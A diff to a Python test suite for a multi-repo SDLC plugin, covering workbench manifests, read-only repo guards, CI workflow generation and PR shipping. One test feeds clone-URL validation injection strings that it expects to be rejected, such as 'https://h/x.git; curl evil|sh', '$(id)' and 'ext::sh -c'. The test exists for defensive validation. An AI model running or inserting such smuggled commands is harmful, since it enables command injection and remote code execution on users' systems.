@@ -49,7 +49,8 @@ class ScopeParsing(ProjectTestCase):
         plan = scaffold.verify_plan(MONOREPO)
         root_steps = [(s["step"], s["cwd"], s["run"]) for s in plan["install"] + plan["verify"]
                       if s["scope"] == scaffold.ROOT_SCOPE]
-        self.assertEqual(root_steps, [("install", ".", "pnpm install"), ("test", ".", "pnpm -r test")])
+        # Only the root test runs: other root commands (install here) keep not running, as before (H3)
+        self.assertEqual(root_steps, [("test", ".", "pnpm -r test")])
         self.assertIn("pnpm -r test", scaffold.generate_ci(scaffold.Project(self.root)))
         # A package's own workflow leaves the root steps out
         self.assertNotIn("pnpm -r test", scaffold.generate_ci(scaffold.Project(self.root), "web"))
@@ -100,9 +101,15 @@ class WorkbenchTestCase(ProjectTestCase):
         git(src, "commit", "-q", "-m", "init")
         return src
 
+    def run_scaffold(self, *args):
+        import subprocess
+        p = subprocess.run([sys.executable, os.path.join(PLUGIN_ROOT, "scripts", "scaffold.py"), "--root", self.root,
+                            *args], capture_output=True, encoding="utf-8", errors="replace")
+        return p.returncode, (json.loads(p.stdout) if p.stdout.strip().startswith("{") else p.stdout), p.stderr
+
     def gitignore(self):
         try:
-            with open(self.path(".gitignore"), encoding="utf-8") as f:
+            with open(self.path(".gitignore"), encoding="utf-8", errors="surrogateescape") as f:
                 return f.read().splitlines()
         except FileNotFoundError:
             return []
@@ -139,12 +146,6 @@ class WorkbenchManifest(WorkbenchTestCase):
             self.write_json("workbench.json", bad)
             with self.assertRaisesRegex(ValueError, "^not run: workbench.json"):
                 sdlc_scopes.manifest(self.root)
-
-    def run_scaffold(self, *args):
-        import subprocess
-        p = subprocess.run([sys.executable, os.path.join(PLUGIN_ROOT, "scripts", "scaffold.py"), "--root", self.root,
-                            *args], capture_output=True, encoding="utf-8", errors="replace")
-        return p.returncode, (json.loads(p.stdout) if p.stdout.strip().startswith("{") else p.stdout), p.stderr
 
     def test_workbench_add_and_remove(self):
         import sdlc_scopes
@@ -222,7 +223,7 @@ def block_rule(name, word, event="bash", field="command"):
             f"  - field: {field}\n    operator: regex_match\n    pattern: {word}\n---\n{name} says no\n")
 
 
-class WorkbenchGuards(WorkbenchTestCase):
+class WorkbenchGuardsCase(WorkbenchTestCase):
     """A session started in the workbench (which has its own .sdlc/): api/ is a writable app repo with its own
     guardrails, specs/ another team's read-only repo."""
 
@@ -254,6 +255,9 @@ class WorkbenchGuards(WorkbenchTestCase):
         self.assertEqual(code, 0, err)
         return (out or {}).get("hookSpecificOutput", {}).get("permissionDecision")
 
+
+
+class WorkbenchGuards(WorkbenchGuardsCase):
     def test_guards_route_into_an_app_repo_from_a_workbench(self):
         api = self.path("api")
         self.assertIn("no-x", self.pre("Bash", command="cd api && echo forbidden") or "")
@@ -506,6 +510,9 @@ class WorkbenchCI(WorkbenchTestCase):
         self.assertIn("github.head_ref || github.ref_name", ci)
         self.assertIn("ref=main", ci)
         self.assertIn("../contract", ci)
+        # The token isn't left in the checkout, and the checkout leaves the app's tree before its own steps (S5, L4)
+        self.assertIn("persist-credentials: false", ci)
+        self.assertIn("&& rm -rf .workbench", ci)
         # Before the install step, and the branch reaches the script only through env, never inlined
         self.assertLess(ci.index("shop-workbench"), ci.index("pnpm install"))
         self.assertNotIn("${{ github.head_ref }}\n", ci.split("run: |", 1)[1].split("env:")[0])
@@ -577,7 +584,7 @@ class PreferredStacks(unittest.TestCase):
                 self.assertRegex(section, rf"\|\s*`?{command}`?\s*\|", (stack, command))
 
 
-class WorkbenchShip(WorkbenchFeatureCase):
+class WorkbenchShipCase(WorkbenchFeatureCase):
     CHANGE = "# Shop checkout\n\n## Acceptance criteria\n\n## Acceptance tests\n\n| AC | Test | Run |\n|---|---|---|\n"
 
     def setUp(self):
@@ -598,6 +605,9 @@ class WorkbenchShip(WorkbenchFeatureCase):
                            env={**os.environ, **(env or {})})
         return p.returncode, p.stdout + p.stderr
 
+
+
+class WorkbenchShip(WorkbenchShipCase):
     def test_ship_commits_each_repo_in_merge_order(self):
         import verify
         for name in ("web", "api"):
@@ -643,11 +653,12 @@ class WorkbenchShip(WorkbenchFeatureCase):
         self.assertIn("3. web", body)
 
     def fake_gh(self, states):
-        """SDLC_GH: a gh stand-in answering `pr view <url> --json state,mergedAt` from `states`."""
+        """SDLC_GH: a gh stand-in answering `pr view --json state,mergedAt -- <url>` from `states`."""
         data = self.write("gh-states.json", json.dumps(states))
         script = self.write("fake_gh.py", "import json, sys\n"
                             f"states = json.load(open({data!r}))\n"
-                            "url = sys.argv[3]\n"
+                            "assert sys.argv[-2] == '--', sys.argv\n"
+                            "url = sys.argv[-1]\n"
                             "s = states[url]\n"
                             "print(json.dumps({'state': s[0], 'mergedAt': s[1]}))\n")
         return {"SDLC_GH": f'"{sys.executable}" "{script}"'}
@@ -683,6 +694,217 @@ class WorkbenchShip(WorkbenchFeatureCase):
             urls["(workbench)"]: ["MERGED", "2026-11-13T10:00:00Z"], urls["api"]: ["MERGED", "2026-11-13T11:00:00Z"],
             urls["web"]: ["MERGED", "2026-11-13T12:00:00Z"]}))[1])
         self.assertEqual((r["done"], r["warnings"]), (True, []))
+
+
+def pre_hook(case, tool, cwd=None, env=None, **tool_input):
+    """The deny reason pretooluse.py gives this call, else None."""
+    from helpers import run_hook
+    payload = {"hook_event_name": "PreToolUse", "tool_name": tool, "tool_input": tool_input, "cwd": cwd or case.root}
+    code, out, raw, err = run_hook(["python3", os.path.join(HOOKS, "pretooluse.py")], payload, cwd or case.root, env)
+    case.assertEqual(code, 0, err)
+    hso = (out or {}).get("hookSpecificOutput", {})
+    return hso.get("permissionDecisionReason", "") if hso.get("permissionDecision") == "deny" else None
+
+
+class ReviewRound1Guards(WorkbenchGuardsCase):
+    """Review round 1: the read-only guard follows every way a command line moves or names a repo, and fails closed."""
+
+    def test_read_only_guard_follows_folder_changes_and_fails_closed(self):
+        denied = ["cd specs && echo x > b.md", "cd specs; echo x >> b.md", "pushd specs && touch b.md",
+                  "chdir specs && rm a.md", "git --git-dir=specs/.git --work-tree=specs commit -am x",
+                  "git --work-tree specs add -A", "GIT_DIR=specs/.git git commit -m x", "git -C specs switch -c x",
+                  "git -C specs branch -D old", "cd specs && git branch new"]
+        for command in denied:
+            self.assertIsNotNone(self.pre("Bash", command=command), command)
+        for command in ("Set-Location specs; 'x' | Out-File b.md", "sl specs; Set-Content b.md x"):
+            self.assertIsNotNone(self.pre("PowerShell", command=command), command)
+        for command in ("git -C specs branch -a", "cd specs && git log > ../log.txt", "cd api && echo x > a.md"):
+            self.assertIsNone(self.pre("Bash", command=command), command)
+        # One malformed entry elsewhere in the manifest doesn't unguard the read-only repo
+        self.write_json("workbench.json", {"repos": [
+            {"name": "api", "url": "u1", "role": "app", "write": True, "owner": 1},
+            {"name": "specs", "url": "u2", "role": "specs", "owner": "@org/ba"},
+            {"name": "x", "role": "nope"},
+        ]})
+        reason = self.pre("Write", file_path=self.path("specs/b.md"), content="x")
+        self.assertIsNotNone(reason)
+        self.assertIn("@org/ba", reason)
+        # A host without CLAUDE_PROJECT_DIR: the workbench is found above the call's folder
+        reason = pre_hook(self, "Bash", cwd=self.path("specs"), env={"CLAUDE_PROJECT_DIR": ""}, command="echo x > b.md")
+        self.assertIsNotNone(reason)
+
+
+class ReviewRound1Manifest(WorkbenchTestCase):
+    def test_manifest_values_stay_clone_urls_and_folders_in_the_workbench(self):
+        import sdlc_scopes
+        for url in ("https://github.com/o/r.git", "git@github.com:o/r.git", "ssh://git@h/o/r", "/tmp/r",
+                    "C:\\repos\\r", "file:///tmp/r", "u1"):
+            self.assertEqual(sdlc_scopes.check_url(url), url)
+        for url in ("https://h/x.git; curl evil|sh", "ext::sh -c touch% x", "fd::3", "a b", "$(id)", "`id`", "-u",
+                    "https://h/x\n", ""):
+            with self.assertRaises(ValueError, msg=url):
+                sdlc_scopes.check_url(url)
+        base = {"url": "u", "role": "specs"}
+        for repos, msg in (([dict(base, name="contract")], "reserved"), ([dict(base, name="CLAUDE.md")], "reserved"),
+                           ([dict(base, name="specs"), dict(base, name="Specs")], "duplicate"),
+                           ([dict(base, name="s", url="https://h/x.git; id")], "clone URL")):
+            self.write_json("workbench.json", {"repos": repos})
+            with self.assertRaisesRegex(ValueError, msg):
+                sdlc_scopes.manifest(self.root)
+        # A listed folder that links outside the workbench is never used as the repo
+        outside = self.origin("elsewhere")
+        os.symlink(outside, self.path("api"))
+        with self.assertRaisesRegex(ValueError, "outside the workbench"):
+            sdlc_scopes.repo_dir(self.root, "api")
+        self.assertEqual(sdlc_scopes.repo_dir(self.root, "web"), self.path("web"))
+
+    def test_listed_repos_come_back_after_a_fresh_clone(self):
+        import doctor
+        api = self.origin("api")
+        self.write_json("workbench.json", {"repos": [{"name": "api", "url": api, "role": "app", "write": True},
+                                                     {"name": "specs", "url": self.origin("specs"),
+                                                      "role": "specs"}]})
+        # A hand-written ignore line in another spelling, and a cp1252 byte doctor must not crash on
+        with open(self.path(".gitignore"), "wb") as f:
+            f.write(b"# caf\xe9\nspecs/\n")
+        r = doctor.Report()
+        doctor.check_workbench(r, self.root)
+        rows = {c["check"]: c for c in r.checks}
+        self.assertEqual(rows["workbench repos"]["fix"], "scaffold.py workbench clone")
+        self.assertNotIn(api, json.dumps(r.checks))
+        code, out, err = self.run_scaffold("workbench", "clone")
+        self.assertEqual(code, 0, (out, err))
+        self.assertEqual(sorted(out["cloned"]), ["api", "specs"])
+        self.assertTrue(os.path.isfile(self.path("api/README.md")))
+        self.assertEqual(self.gitignore().count("specs/") + self.gitignore().count("/specs/"), 1, self.gitignore())
+        self.assertIn("/api/", self.gitignore())
+        with open(self.path(".gitignore"), "rb") as f:
+            self.assertTrue(f.read().startswith(b"# caf\xe9\n"))  # the user's bytes survive the rewrite
+        code, out, err = self.run_scaffold("workbench", "clone", "api")
+        self.assertEqual((code, out["cloned"], out["already_cloned"]), (0, [], ["api"]), err)
+        code, out, err = self.run_scaffold("workbench", "clone", "nope")
+        self.assertNotEqual(code, 0)
+        # remove drops the line in any spelling
+        code, out, err = self.run_scaffold("workbench", "remove", "specs")
+        self.assertEqual(code, 0, (out, err))
+        self.assertFalse([x for x in self.gitignore() if x.strip("/") == "specs"], self.gitignore())
+        # No temp file is left behind when a write fails
+        from unittest import mock
+        with mock.patch.object(scaffold.os, "replace", side_effect=OSError("disk")):
+            with self.assertRaises(OSError):
+                scaffold._write_atomic(self.path("workbench.json"), "{}")
+        self.assertFalse([f for f in os.listdir(self.root) if f.startswith(".tmp-")])
+
+    def test_contract_runs_keep_the_root_test(self):
+        self.write_json(".sdlc/config.json", MONOREPO)
+        self.write_json(".sdlc/scaffold.lock.json", {"command_runs": {
+            scaffold.ROOT_SCOPE: {"test": {"command": "pnpm -r test", "exit": 0}}}})
+        out = scaffold.cmd_contract(scaffold.Project(self.root), None)
+        self.assertIn("test", out["runs"][scaffold.ROOT_SCOPE])
+
+
+class ReviewRound1Feature(WorkbenchFeatureCase):
+    def test_writes_wait_for_the_feature_branch(self):
+        reason = pre_hook(self, "Write", file_path=self.path("api/a.py"), content="x")
+        self.assertIsNotNone(reason)
+        self.assertIn("repo feat api", reason)
+        self.assertIsNotNone(pre_hook(self, "Bash", command="cd api && echo x > a.py"))
+        self.assertIsNone(pre_hook(self, "Write", file_path=self.path("docs/a.md"), content="x"))
+        self.assertIsNone(pre_hook(self, "Bash", command="cat api/README.md"))
+        self.assertEqual(self.state("repo", "feat", "api")[0], 0)
+        self.assertIsNone(pre_hook(self, "Write", file_path=self.path("api/a.py"), content="x"))
+        # No active feature (setup, or between features): writes stay open
+        self.assertEqual(self.state("set", "feat", "Status", "done")[0], 0)
+        self.assertIsNone(pre_hook(self, "Write", file_path=self.path("web/a.py"), content="x"))
+
+    def test_repo_refuses_a_default_branch_and_adopts_its_own(self):
+        import sdlc_scopes
+        default = next(b for b in ("main", "master") if git_out(self.root, "rev-parse", "--verify", "-q", b))
+        git(self.root, "checkout", "-q", default)
+        code, out = self.state("repo", "feat", "api")
+        self.assertEqual(code, 1, out)
+        self.assertIn("default branch", json.loads(out)["error"])
+        self.assertEqual(git_out(self.path("api"), "branch", "--show-current"), "main")
+        git(self.root, "checkout", "-q", "feat-x")
+        # A branch a crashed run created, checked out and grown from the base, is adopted
+        base = git_out(self.path("web"), "rev-parse", "HEAD")
+        git(self.path("web"), "checkout", "-q", "-b", "feat-x")
+        code, out = self.state("repo", "feat", "web")
+        self.assertEqual(code, 0, out)
+        self.assertEqual(sdlc_scopes.feature_repos(self.state_text())["web"], {"branch": "feat-x", "base": base})
+        # A link out of the workbench is refused
+        import shutil
+        shutil.rmtree(self.path("api"))
+        os.symlink(self.origin("elsewhere"), self.path("api"))
+        code, out = self.state("repo", "feat", "api")
+        self.assertEqual(code, 1, out)
+        self.assertIn("outside the workbench", json.loads(out)["error"])
+
+    def test_read_only_moved_needs_one_active_feature(self):
+        import diff_stats
+        specs = self.path("specs")
+        self.assertEqual(self.state("repo", "feat", "specs")[0], 0)
+        self.write("specs/c.md", "c")
+        git(specs, "add", "-A")
+        git(specs, "commit", "-q", "-m", "c")
+        self.assertEqual(len(diff_stats.moved_read_only(self.root, [])), 1)
+        code, out = self.state("new", "feat2", "--track", "S", "--risk", "low", "--task", "x | AC-001 | a.py")
+        self.assertEqual(code, 0, out)
+        self.assertEqual(diff_stats.moved_read_only(self.root, []), [])
+
+
+class ReviewRound1Ship(WorkbenchShipCase):
+    def test_ship_acts_only_on_writable_repos_and_refuses_before_moving(self):
+        import verify
+        for name in ("web", "api"):
+            self.assertEqual(self.state("repo", "feat", name)[0], 0)
+        self.write("api/a.py", "x = 1\n")
+        self.write("api/broken", "")  # api's own check would fail if it ran
+        manifest = {"repos": [
+            {"name": "web", "url": "https://example.com/web.git", "role": "app", "write": True},
+            {"name": "api", "url": "https://example.com/api.git", "role": "specs"},
+            {"name": "specs", "url": "u3", "role": "specs"}]}
+        self.write_json("workbench.json", manifest)
+        failures = verify.repo_failures(self.root, "feat", 60)
+        self.assertEqual(len(failures), 1, failures)
+        self.assertTrue(failures[0].startswith("not run: api isn't a writable repo"), failures)
+        self.assertNotIn("api", [n for n, _ in verify.branched_repos(self.root, "feat")])
+        before = self.state_text()
+        code, out = self.ship("--review", "No review ran: test.")
+        self.assertNotEqual(code, 0, out)
+        self.assertIn("api isn't a writable repo", out)
+        self.assertEqual(self.state_text(), before)
+        # A repo on the wrong branch, or a listed folder not gitignored: refused with the state untouched
+        manifest["repos"][1]["role"], manifest["repos"][1]["write"] = "app", True
+        self.write_json("workbench.json", manifest)
+        os.remove(self.path("api/broken"))
+        git(self.path("api"), "checkout", "-q", "main")
+        code, out = self.ship("--review", "No review ran: test.")
+        self.assertNotEqual(code, 0, out)
+        self.assertIn("not the feature's branch", out)
+        self.assertEqual(self.state_text(), before)
+        git(self.path("api"), "checkout", "-q", "feat-x")
+        self.write(".gitignore", "/api/\n/specs/\n")
+        code, out = self.ship("--review", "No review ran: test.")
+        self.assertNotEqual(code, 0, out)
+        self.assertIn("web/ isn't gitignored", out)
+        self.assertEqual(self.state_text(), before)
+
+    def test_pr_urls_are_never_options_and_gh_errors_are_said(self):
+        import sdlc_scopes
+        for bad in ("--web", "-R=other/repo", "https://h/o/r/issues/1", "x y"):
+            code, out = self.state("pr", "feat", "api", "--", bad)
+            self.assertEqual(code, 1, (bad, out))
+        self.assertEqual(sdlc_scopes.feature_prs("## PRs\n- api: --web\n- web: 12\n"), {"web": "12"})
+        url = "https://example.com/api/pull/2"
+        self.assertEqual(self.state("pr", "feat", "api", url)[0], 0)
+        script = self.write("gh_fail.py", "import sys\nsys.stderr.write('gh: not logged in')\nsys.exit(4)\n")
+        code, out = self.ship("--status", env={"SDLC_GH": f'"{sys.executable}" "{script}"'})
+        self.assertEqual(code, 0, out)
+        r = json.loads(out)
+        self.assertFalse(r["done"])
+        self.assertIn("not logged in", r["errors"][0])
+        self.assertIn("api", r["errors"][0])
 
 
 if __name__ == "__main__":
